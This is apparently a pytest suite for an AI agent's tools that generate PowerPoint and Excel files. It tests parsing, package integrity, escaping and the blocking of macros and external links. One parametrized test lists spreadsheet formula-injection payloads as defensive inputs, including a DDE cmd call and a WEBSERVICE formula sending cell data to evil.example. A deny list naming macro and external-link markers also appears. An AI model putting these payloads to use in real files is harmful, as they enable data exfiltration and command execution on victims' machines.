"""PowerPoint and Excel files: well-formed packages, safe content, and the tools that save them."""

import io
import os
import posixpath
import re
import xml.etree.ElementTree as ET
import zipfile

import pytest

from ragnarok.policy.permissions import Risk
from ragnarok.runtime.loop import Session
from ragnarok.skills.documents import (
    CreatePresentationArgs,
    CreateSpreadsheetArgs,
    document_tools,
)
from ragnarok.skills.office import (
    MAX_SLIDES,
    SlideSpec,
    _column_name,
    build_pptx,
    build_xlsx,
    parse_outline,
    parse_table,
    sheet_name,
)
from tests.test_m2_memory import key  # noqa: F401  (fixture)
from tests.test_m4_agent import build, call, kinds, say

A = "{http://schemas.openxmlformats.org/drawingml/2006/main}"
FORBIDDEN = (
    "vbaProject", "macro", "hlinkClick", "http://evil", "externalLink", "oleObject",
    'TargetMode="External"', "script",
)  # fmt: skip
OUTLINE = "# Causes\n- Fossil fuels\n- Deforestation\n# Fixes\n- Renewables\n- Plant trees"


def open_zip(data: bytes) -> zipfile.ZipFile:
    z = zipfile.ZipFile(io.BytesIO(data))
    assert z.testzip() is None
    return z


def assert_package_is_consistent(data: bytes) -> dict[str, bytes]:
    """Every part is well-formed XML, has a content type, and every relationship target exists."""
    z = open_zip(data)
    parts = {n: z.read(n) for n in z.namelist()}
    for raw in parts.values():
        ET.fromstring(raw)  # well-formed
    types = ET.fromstring(parts["[Content_Types].xml"])
    defaults = {e.get("Extension") for e in types if e.tag.endswith("Default")}
    overrides = {e.get("PartName") for e in types if e.tag.endswith("Override")}
    for name in parts:
        if name == "[Content_Types].xml":
            continue
        assert "/" + name in overrides or name.rsplit(".", 1)[-1] in defaults, f"no type for {name}"
    for override in overrides:
        assert override.lstrip("/") in parts, f"content type for a missing part {override}"
    for name, raw in parts.items():
        if not name.endswith(".rels"):
            continue
        base = posixpath.dirname(posixpath.dirname(name))  # the folder the rels file describes
        for rel in ET.fromstring(raw):
            target = posixpath.normpath(posixpath.join(base, rel.get("Target")))
            assert target in parts, f"{name} points at the missing part {target}"
    return parts


def slide_texts(parts: dict[str, bytes], number: int) -> list[str]:
    root = ET.fromstring(parts[f"ppt/slides/slide{number}.xml"])
    return ["".join(t.text or "" for t in p.iter(f"{A}t")) for p in root.iter(f"{A}p")]


# ---- outline -> slides ------------------------------------------------------------------------


def test_an_outline_becomes_slides_with_bullets():
    slides = parse_outline(OUTLINE)
    assert [(s.title, s.bullets) for s in slides] == [
        ("Causes", ["Fossil fuels", "Deforestation"]),
        ("Fixes", ["Renewables", "Plant trees"]),
    ]


@pytest.mark.parametrize(
    "line", ["- point", "* point", "• point", "1. point", "2) point", "  - point  ", "point"]
)
def test_bullet_markers_of_every_kind_are_stripped(line):
    assert parse_outline(f"# S\n{line}")[0].bullets == ["point"]


def test_text_before_the_first_heading_gets_a_slide_of_its_own():
    slides = parse_outline("- loose point\n# Real\n- x")
    assert [s.title for s in slides] == ["Overview", "Real"] and slides[0].bullets == [
        "loose point"
    ]


def test_deeper_heading_marks_and_blank_lines_are_fine():
    slides = parse_outline("\n## Two hashes\n\n- a\n\n### Three\n- b\n")
    assert [s.title for s in slides] == ["Two hashes", "Three"]


@pytest.mark.parametrize("bad", ["", "   \n  \n", "#", "# \n"][:3])
def test_an_empty_outline_is_explained(bad):
    if bad.strip() == "#":
        assert parse_outline(bad)[0].title == "Untitled"  # a bare # is a slide without a title
        return
    with pytest.raises(ValueError, match="outline is empty"):
        parse_outline(bad)


def test_too_many_slides_or_points_are_refused():
    with pytest.raises(ValueError, match="at most 40 slides"):
        parse_outline("\n".join(f"# s{i}" for i in range(MAX_SLIDES + 1)))
    with pytest.raises(ValueError, match="at most 12 points"):
        parse_outline("# big\n" + "\n".join(f"- p{i}" for i in range(13)))


# ---- the .pptx package ---------------------------------------------------------------------------


def test_a_deck_is_a_consistent_package_with_a_title_slide_and_one_slide_per_entry():
    parts = assert_package_is_consistent(build_pptx("Climate", "An intro", parse_outline(OUTLINE)))
    assert slide_texts(parts, 1) == ["Climate", "An intro"]
    assert slide_texts(parts, 2) == ["Causes", "Fossil fuels", "Deforestation"]
    assert slide_texts(parts, 3) == ["Fixes", "Renewables", "Plant trees"]
    assert "ppt/slides/slide4.xml" not in parts


def test_a_title_entry_in_the_outline_becomes_the_opening_slide_not_a_duplicate():
    parts = assert_package_is_consistent(
        build_pptx("Climate", "", parse_outline("# Title\n- by me\n# Causes\n- x"))
    )
    assert slide_texts(parts, 1) == ["Climate", "by me"] and slide_texts(parts, 2)[0] == "Causes"
    assert "ppt/slides/slide3.xml" not in parts


def test_slide_text_cannot_break_the_file_or_inject_markup():
    nasty = '<b>bold</b> & "quotes" </a:t></a:r><a:r><a:t>injected\x00\x01'
    parts = assert_package_is_consistent(
        build_pptx(nasty, nasty, [SlideSpec("S " + nasty, [nasty, "café → 日本"])])
    )
    assert slide_texts(parts, 2)[0] == 'S <b>bold</b> & "quotes" </a:t></a:r><a:r><a:t>injected'
    assert slide_texts(parts, 2)[2] == "café → 日本"


def test_the_same_input_always_gives_the_same_file():
    slides = parse_outline(OUTLINE)
    assert build_pptx("T", "s", slides) == build_pptx("T", "s", slides)
    assert build_pptx("T", "s", slides) != build_pptx("T2", "s", slides)


@pytest.mark.parametrize(
    ("bullets", "size"),
    [
        (["a", "b"], 2400),
        (["x" * 80] * 4, 2000),
        (["x" * 60] * 6 + ["y"], 1800),
        (["x"] * 10, 1600),
    ],
)
def test_long_slides_get_smaller_text_so_they_fit(bullets, size):
    parts = build_pptx("T", "", [SlideSpec("S", bullets)])
    xml = open_zip(parts).read("ppt/slides/slide2.xml").decode()
    assert f'sz="{size}"' in xml


def test_a_deck_contains_nothing_that_can_run_or_phone_home():
    data = build_pptx("T", "", parse_outline(OUTLINE))
    for name, raw in assert_package_is_consistent(data).items():
        text = raw.decode("utf-8")
        for forbidden in FORBIDDEN:
            assert forbidden not in text, (name, forbidden)


# ---- table -> sheet ---------------------------------------------------------------------------


def test_tables_may_use_bars_commas_or_tabs():
    for sep in ("|", ",", "\t"):
        rows = parse_table(f"a{sep}b\n1{sep}2")
        assert rows == [["a", "b"], ["1", "2"]]


def test_markdown_tables_lose_their_separator_row_and_outer_bars():
    assert parse_table("| Name | Qty |\n|---|---|\n| Pen | 3 |") == [["Name", "Qty"], ["Pen", "3"]]
    assert parse_table("| a | b |\n| :--- | ---: |\n| 1 | 2 |") == [["a", "b"], ["1", "2"]]


def test_short_rows_are_padded_and_empty_tables_refused():
    assert parse_table("a|b|c\n1") == [["a", "b", "c"], ["1", "", ""]]
    with pytest.raises(ValueError, match="empty"):
        parse_table("\n  \n")


def test_table_size_limits():
    with pytest.raises(ValueError, match="rows"):
        parse_table("a\n" + "\n".join("1" for _ in range(2001)))
    with pytest.raises(ValueError, match="columns"):
        parse_table("|".join(f"c{i}" for i in range(51)))


@pytest.mark.parametrize(
    ("index", "name"), [(0, "A"), (25, "Z"), (26, "AA"), (27, "AB"), (701, "ZZ"), (702, "AAA")]
)
def test_column_letters(index, name):
    assert _column_name(index) == name


def sheet_xml(rows):
    parts = assert_package_is_consistent(build_xlsx("Budget", rows))
    return parts["xl/worksheets/sheet1.xml"].decode()


def test_numbers_are_numbers_text_is_text_and_the_header_is_styled():
    xml = sheet_xml(parse_table("Item|Cost\nPen|12.50\nBook|-3\nCode|007x\nEmpty|"))
    assert '<c r="B2"><v>12.50</v></c>' in xml and '<c r="B3"><v>-3</v></c>' in xml
    assert 't="inlineStr"' in xml and '<t xml:space="preserve">Pen</t>' in xml
    assert '<c r="A1" t="inlineStr" s="1">' in xml  # header cells use the bold style
    assert '<c r="B5"/>' in xml  # an empty cell is empty
    assert 'state="frozen"' in xml  # the header row stays in view


def test_ordinary_formulas_are_kept_as_formulas():
    xml = sheet_xml(parse_table("a|b|total\n1|2|=SUM(A2:B2)\n3|4|=A3*B3+(A3/2)^2"))
    assert "<f>SUM(A2:B2)</f>" in xml and "<f>A3*B3+(A3/2)^2</f>" in xml


@pytest.mark.parametrize(
    "formula",
    [
        "=cmd|' /C calc'!A0",
        '=WEBSERVICE("http://evil.example/"&A1)',
        '=HYPERLINK("http://evil.example","click")',
        '=CALL("user32","MessageBoxA")',
        '=INDIRECT("Sheet2!A1")',
        '=EXEC("calc")',
        "=SUM(A1:A2)|calc",
        "=@SUM(A1)",
        "=1+1;cmd",
        "=" + "1+" * 300 + "1",
    ],
)
def test_dangerous_formulas_are_stored_as_plain_text(formula):
    xml = sheet_xml([["h"], [formula]])
    assert "<f>" not in xml  # never calculated
    assert (
        't="inlineStr"' in xml and "&apos;" in xml
    ) or "'=" in xml  # shown as text, marked with a quote


def test_cell_text_cannot_break_the_sheet():
    xml = sheet_xml([["h"], ['<script>"&</script>'], ["café 日本"]])
    assert "&lt;script&gt;" in xml and "café 日本" in xml


@pytest.mark.parametrize(
    ("title", "name"),
    [("Monthly expenses", "Monthly expenses"), ("a/b\\c:d*e?f[g]h", "a b c d e f g h"),
     ("x" * 80, "x" * 31), ("'quoted'", "quoted"), ("///", "Sheet1")],
)  # fmt: skip
def test_sheet_names_follow_excels_rules(title, name):
    assert sheet_name(title) == name


def test_column_widths_follow_the_content_but_stay_sensible():
    xml = sheet_xml([["id", "description"], ["1", "x" * 100]])
    assert 'width="8"' in xml and 'width="60"' in xml


def test_the_same_table_always_gives_the_same_file():
    rows = parse_table("a|b\n1|2")
    assert build_xlsx("t", rows) == build_xlsx("t", rows)


# ---- the tools -----------------------------------------------------------------------------------


async def make(tmp_path, name, **args):
    tool = {t.name: t for t in document_tools(tmp_path)}[name]
    return await tool.handler(tool.args_model(**args))


async def test_make_a_presentation_end_to_end(tmp_path):
    result = await make(
        tmp_path, "create_presentation", title="Climate change", outline=OUTLINE, subtitle="Intro"
    )
    path = tmp_path / "Ragnarok" / "Climate change.pptx"
    assert (
        result.final and result.text == f"Created Climate change.pptx (3 slides) in {path.parent}."
    )
    parts = assert_package_is_consistent(path.read_bytes())
    assert slide_texts(parts, 1) == ["Climate change", "Intro"]


async def test_make_a_spreadsheet_end_to_end(tmp_path):
    table = (
        "Item | Jan | Feb\nRent | 9000 | 9000\nFood | 3500 | 3200\n"
        "Total | =SUM(B2:B3) | =SUM(C2:C3)"
    )
    result = await make(tmp_path, "create_spreadsheet", title="Monthly expenses", table=table)
    path = tmp_path / "Ragnarok" / "Monthly expenses.xlsx"
    assert result.text == f"Created Monthly expenses.xlsx (3 rows, 3 columns) in {path.parent}."
    assert (
        "<f>SUM(B2:B3)</f>"
        in assert_package_is_consistent(path.read_bytes())["xl/worksheets/sheet1.xml"].decode()
    )


async def test_asking_twice_makes_one_file_and_a_changed_one_never_overwrites(tmp_path):
    first = await make(tmp_path, "create_presentation", title="Talk", outline=OUTLINE)
    again = await make(tmp_path, "create_presentation", title="Talk", outline=OUTLINE)
    other = await make(tmp_path, "create_presentation", title="Talk", outline="# Different\n- x")
    assert first.text.startswith("Created") and again.text.startswith("Already created")
    assert other.text.startswith("Created Talk (1).pptx")
    assert sorted(p.name for p in (tmp_path / "Ragnarok").iterdir()) == [
        "Talk (1).pptx",
        "Talk.pptx",
    ]


async def test_bad_input_is_explained_not_raised(tmp_path):
    out = await make(tmp_path, "create_presentation", title="Empty", outline="   \n  ")
    assert out.startswith("error:") and "outline is empty" in out
    out = await make(tmp_path, "create_spreadsheet", title="Empty", table="   ")
    assert out.startswith("error:") and "empty" in out
    assert not (tmp_path / "Ragnarok").exists() or not list((tmp_path / "Ragnarok").iterdir())


async def test_a_crash_while_saving_leaves_no_broken_deck(tmp_path, monkeypatch):
    from ragnarok.skills import documents

    def crash(path, data):
        path.with_name(path.name + ".part").write_bytes(data[:10])
        raise OSError("power cut")

    monkeypatch.setattr(documents, "_write", crash)
    out = await make(tmp_path, "create_presentation", title="Talk", outline=OUTLINE)
    assert out.startswith("error:") and not list((tmp_path / "Ragnarok").glob("*.pptx"))
    monkeypatch.undo()
    again = await make(tmp_path, "create_presentation", title="Talk", outline=OUTLINE)  # the retry
    assert again.text.startswith("Created") and not list((tmp_path / "Ragnarok").glob("*.part"))


def test_the_tools_declare_what_the_rules_require(tmp_path):
    tools = {t.name: t for t in document_tools(tmp_path)}
    assert set(tools) == {"create_document", "create_presentation", "create_spreadsheet"}
    for tool in tools.values():
        assert tool.risk is Risk.R1 and tool.idempotent and tool.sandbox == "workspace-write"
        assert tool.fs == {"write": [str(tmp_path / "Ragnarok")]} and tool.network == []
        assert len(tool.description.split(". ")) <= 2 and tool.timeout_s > 0
    assert set(tools["create_presentation"].spec()["function"]["parameters"]["properties"]) == {
        "title", "outline", "subtitle",
    }  # fmt: skip
    with pytest.raises(ValueError):
        CreatePresentationArgs(title="x", outline="# a")
    with pytest.raises(ValueError):
        CreateSpreadsheetArgs(title="ok", table="")


async def test_make_a_ppt_on_a_topic_through_the_agent(tmp_path, key):  # noqa: F811
    vault, store, svc, chat, agent = build(
        tmp_path,
        key,
        [
            call(
                "create_presentation",
                title="Solar energy",
                outline=(
                    "# How it works\n- Panels turn light into power\n"
                    "# Why use it\n- Clean and cheap"
                ),
            ),
            say("unused"),
        ],
    )
    agent.tools.update({t.name: t for t in document_tools(tmp_path / "Documents")})
    seen = {}
    real = agent.tools["create_presentation"].handler

    async def spy(args):
        seen["events"] = kinds(vault)
        return await real(args)

    agent.tools["create_presentation"].handler = spy
    result = await agent.turn(Session(), "make a ppt on solar energy")
    assert seen["events"] == ["user_message", "memory_tool_call"]  # logged before acting
    assert len(chat.calls) == 1 and result.final_tool and "(3 slides)" in result.text
    assert (tmp_path / "Documents" / "Ragnarok" / "Solar energy.pptx").exists()
    vault.close()


# ---- real PowerPoint and Excel (only when asked for: they start the programs) -----------------


@pytest.mark.skipif(os.environ.get("RAGNAROK_OFFICE_TESTS") != "1", reason="starts real Office")
def test_real_powerpoint_and_excel_open_what_we_build(tmp_path):
    import pythoncom
    import win32com.client

    (tmp_path / "d.pptx").write_bytes(build_pptx("Deck", "sub", parse_outline(OUTLINE)))
    (tmp_path / "b.xlsx").write_bytes(build_xlsx("Book", parse_table("a|b|c\n1|2|=A2+B2")))
    pythoncom.CoInitialize()
    ppt = win32com.client.DispatchEx("PowerPoint.Application")
    try:
        pres = ppt.Presentations.Open(str(tmp_path / "d.pptx"), True, False, False)
        assert pres.Slides.Count == 3
        assert pres.Slides(2).Shapes(1).HasTextFrame
        pres.Close()
    finally:
        ppt.Quit()
    xl = win32com.client.DispatchEx("Excel.Application")
    try:
        xl.DisplayAlerts = False
        wb = xl.Workbooks.Open(str(tmp_path / "b.xlsx"), ReadOnly=True)
        assert wb.Worksheets(1).Cells(2, 3).Value == 3.0  # the formula was calculated
        wb.Close(False)
    finally:
        xl.Quit()


def test_helper_regex_for_the_dangerous_formula_test_is_not_vacuous():
    # guards the test above: a formula that IS safe must produce a real <f> element
    assert "<f>" in sheet_xml([["h"], ["=SUM(A1:A2)"]])
    assert re.search(r"<f>", sheet_xml([["h"], ["=1+1"]]))
